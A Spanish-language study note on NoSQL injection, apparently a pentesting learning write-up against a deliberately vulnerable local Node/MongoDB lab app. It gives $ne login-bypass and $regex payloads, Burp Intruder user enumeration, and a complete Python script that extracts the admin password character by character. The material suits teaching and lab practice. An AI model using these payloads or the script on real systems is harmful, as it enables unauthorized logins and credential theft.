-----
- Tags: #vulnerabilidades #web #NOSQL
----
# Definición

> Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos **NoSQL**, como **MongoDB**, **Cassandra** y **CouchDB**, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

-----
# Explotación de inyección NOSQL en laboratorio

Lo primero que haremos será clonar el repositorio de Github [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app) para montar el laboratorio en Docker, realizando un ``docker-compose up -d``.

Nos dirigimos al puerto que realiza el Port Forwarding en el contenedor, el cual es el *puerto 4000*. http://localhost:4000 y reseteamos la base de datos presionando el botón *Reset DB*. En la web dispondremos de dos secciones, una es el panel de Login, y la otra será una sección para buscar los usuarios registrados en la web por su nombre.

-----

Para realizar la explotación NOSQL nos apoyaremos de un **repositorio en Github** que utilizamos anteriormente *PayloadsAllTheThings* https://github.com/swisskyrepo/PayloadsAllTheThings filtrando por NOSQL, acá encontraremos varios Payloads que se pueden utilizar para verificar la vulnerabilidad, también utilizaremos la web https://book.hacktricks.xyz/pentesting-web/nosql-injection, recomiendo leer por completos ambos contenidos para aprender en profundidad todo.

Tenemos que entender que este tipo de inyecciones se apoyan mucho de las "**Condiciones**" ya que podemos inyectar una condición especifica en la petición para autenticarnos o para conseguir credenciales, unos ejemplos de esto serían las **expresiones regulares** (Regex), las condiciones **Not Equal**, **Greater than**, **Less than**, etc.

----
## NOSQL con condiciones

- ``username[$ne]=toto&password[$ne]=toto`` acá estamos diciendo que el usuario **NO ES IGUAL** (``ne``) a "toto" y que la contraseña **NO ES IGUAL** (``ne``) a "toto"

Podemos aprovecharnos de esa condición que colocamos para que nos de mediante un estado **Booleano True** pistas para obtener privilegios o autenticarnos directamente

Nosotros sabemos que el usuario "*guest*" existe porque la web en la sección de búsqueda de usuarios nos dan su nombre como ejemplo y como usuario válido, por lo tanto podríamos aprovecharnos de eso para encontrar su contraseña de la siguiente manera.

(Es importante entender que nosotros al poseer un ``Content-Type`` *json* debemos **colocar la petición en ese formato**, esto está contemplado en **PayloadsAllTheThings**)

- ``username=guest&password[$ne]=probando123``

![[NOSQLI 1.png]]

----
## NOSQL con Regex

Podríamos obtener mediante **fuerza bruta manual o automatizada** las credenciales para un usuario válido por ejemplo utilizando **expresiones regulares** en la petición, indicando que la contraseña comienza por la letra "*a*" tal que así ``^a``.

- ``{"username": {"$eq": "admin"}, "password": {"$regex": "^a" }}`` donde en el campo ``^a`` podríamos iterar por todos los caracteres existentes, hasta que nos loguee en la cuenta de **admin**.

Iríamos probando de la *a-z, A-Z, 0-9*, etc.

![[NOSQLI 2.png]]

![[NOSQLI 3.png]]

Realizar esto de forma manual puede ser tedioso, por lo tanto mas adelante realizaremos un script en **Python3** para que lo haga por nosotros.

-----

Esto también se podría utilizar para **hallar todos los usuarios existentes** en la base de datos, **fuzzeando caracter por caracter** con ``^a`` en el campo "*username*" pasando por todos los caracteres existentes.

Para hacer todo esto mas rápido podríamos utilizar el **Intruder** de Burpsuite para iterar por todos los caracteres existentes.

![[NOSQLI 4.png]]

![[NOSQLI 5.png]]

![[NOSQLI 6.png]]

Luego le damos a **Start Attack** y esperamos a que nos de las combinaciones. Cabe destacar que en este laboratorio **hay dos usuarios** que empiezan por la letra "*a*" y **dos usuarios** que empiezan por la letra "*g*", por lo tanto **solo nos mostrará la primer coincidencia**, para obtener los usuarios que comiencen con los mismos caracteres, debemos hacer un script en Python o emplear un diccionario mas especifico con combinaciones como "*aa*" "*ab*" "*ac*", etc.

![[NOSQLI 7.png]]
## NOSQL con script Python (Regex)

El siguiente script que crearemos será útil para hallar contraseñas válidas para un usuario dado.

```python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

# Ctrl+C --------------------------------
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
#----------------------------------------

# Variables globales --------------------
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
# Variables globales --------------------


# Función del script que hará todo --------------------------------------------------------------------
def makeNOSQLI():

# Barras de progreso (PWNTOOLS) -----------------------------
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password")
# Barras de progreso (PWNTOOLS)-----------------------------

    password = "" # Variable Password donde se irán almacenando los caracteres válidos.

    for position in range(1, 100): # Iteramos del 1 al 100

        for character in characters:

            post_data = '{"username": "admin", "password": {"$regex": "^%s%s" }}' % (password, character) # Petición por POST almacenada en variable utilizando "%s%s" donde el primer %s irá "password" y luego "character", como password no vale nada, a medida que se realicen las iteraciónes del 1 al 100, irá pasando de caracter en caracter.

            p1.status(post_data) # Actualizamos el estado de la barra de progreso de PWN TOOLS para que nos muestre siempre el contenido de "post_data" actualizandose.

            headers = {'Content-Type': 'application/json'} # Especificamos en la petición POST que tendrá una cabecera de tipo "json" (Esta la sacamos del Burpsuite observando el Content Type)

            r = requests.post(login_url, headers=headers, data=post_data) # Almacenamos la respuesta de la petición con sus códigos de estado y demás.

            if "Logged in as user" in r.text: # Condicional para indicar que si en el texto de la respuesta se encuentra la cadena "Logged in as user" añada el caracter que brindó esa respuesta a la variable password.
                password += character
                p2.status(password) # Colocamos la barra de progreso para que nos vaya mostrando como van añadiendose los caracteres uno a uno.
                break # Break para que cuando encuentre la coincidencia que brinde la cadena de texto, pase a la siguiente vuelta del range(1, 100)

if __name__ == '__main__':

    makeNOSQLI()
```

De esta forma obtendríamos la contraseña del usuario que especifiquemos en la variable "*post_data*", si quisiéramos conseguir todos los usuarios existentes, podríamos modificar la variable para que itere por los usuarios y deberíamos quitar el "BREAK" del condicional para que no se detenga y encuentre los usuarios que posean los mismos caracteres como es el caso de "*guest*" con el usuario "*ghost*" que están en este laboratorio.

# ``' || '1'=='1`` con NOSQLI

Al igual que en las SQLI, en **NOSQLI** podemos realizar un el típico ``'or 1=1-- -`` para **obtener mas datos** en una web (Si esta es vulnerable claramente), esto se emplea aplicando lo mismo que en una SQLI, pero **cambiando algunos caracteres**. 
Normalmente cuando se acontecen NOSQLI lo que se suele emplear por detrás es **MongoDB**, por lo tanto si observamos en *PayloadsAllTheThings* o en *HackTricks*, encontraremos payloads tales como estos.

![[NOSQLI 8.png]]

Si colocamos esto en el campo de búsqueda de usuarios podremos buscar todos los usuarios existentes sin saber sus nombres, esto serviría para comenzar a conseguir sus contraseñas con los ejemplos anteriores.

![[NOSQLI 9.png]]

# Consejo extra

Hay algo que podemos emplear a la hora de realizar una auditoría a un servicio web, y es que si encontramos algún campo en el que podamos listar datos de cualquier tipo, como por ejemplo el *User Lookup* en nuestro caso, es muy común que al interceptar la petición con **Burpsuite**, notar que está siendo tramitada por *GET*, por lo tanto podemos intentar cambiar el método de petición a *POST* y si esta es interpretada de forma válida probar cambiar el formato *Content-Type* que posea, por el formato ``Content-Type: application/json``, para validar si nos interpreta la petición por *POST* y con formato *json*, de esta manera si detectamos que nos interpreta ambas cosas, podríamos comenzar a la explotación **NOSQLI** con *Regex* o con *Condicionales*.